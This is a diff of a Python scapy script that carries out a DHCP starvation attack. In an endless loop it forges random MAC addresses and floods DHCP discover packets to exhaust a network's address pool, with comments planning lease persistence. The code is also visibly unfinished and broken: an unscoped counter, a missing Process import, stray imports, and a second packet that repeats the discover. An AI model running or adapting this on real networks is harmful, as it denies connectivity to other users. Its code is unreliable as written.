@@ -3,12 +3,15 @@
 
 
 import argparse
+from itertools import count
 import random
 import re
-#from scapy.all import *
+from urllib import response
+from scapy.all import *
+import progress
 
 IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   
-
+count = 0
 
 
 def validate_ip_address(address):
@@ -36,15 +39,39 @@ def starv():
     #will take all the available ip addresses
     #if the -p check is true, will save clock for every ip address and will renew the
     #dhcp request 5 seconds before the end of the clock
-    while True:
-        mac = ganerate_mac_address()
-        dhcp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0")/UDP(sport=68,dport=67)/DHCP(options=[("message-type","request")])
-        dhcp_request.src = mac
+    target = "255.255.255.255"
+    if(args.target):
+        target = args.target
+    dhcp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst=target)/UDP(sport=68,dport=67)/BOOTP(op=1)/DHCP(options=[('message-type','discover'),('end')])
+    while True: #meybe do change the while loop till we get the dhcp server full 
+        #send to other function with other proceses
+        p = Process(target=sendPacket, args=(dhcp_request,))
+        p.start()
+        p.join()
+
+        print(count)        
+        
+
         
         #need to send the dhcp request to the target
     
+def sendPacket(dhcp_request):
+    mac = ganerate_mac_address()
+    dhcp_request.src = mac
+    response = sr1(dhcp_request, iface=args.iface)
+    if response:
+        dhcp_request.dst = response.src
+        #dhcp_request.options =[('message-type','request'),('requested_addr',response.getlayer(BOOTP).yiaddr),('server_id',response.getlayer(BOOTP).siaddr),('end')]
 
-
+        response = sr1(dhcp_request, iface=args.iface)
+        if response:
+            count += 1
+    #TODO:
+    #check how we get the clock for the dhcp request
+    #if the -p check is true, will save clock for every ip address and will renew the
+    
+    #if(args.persist):
+        #time.sleep(5)
 
 
 def main():
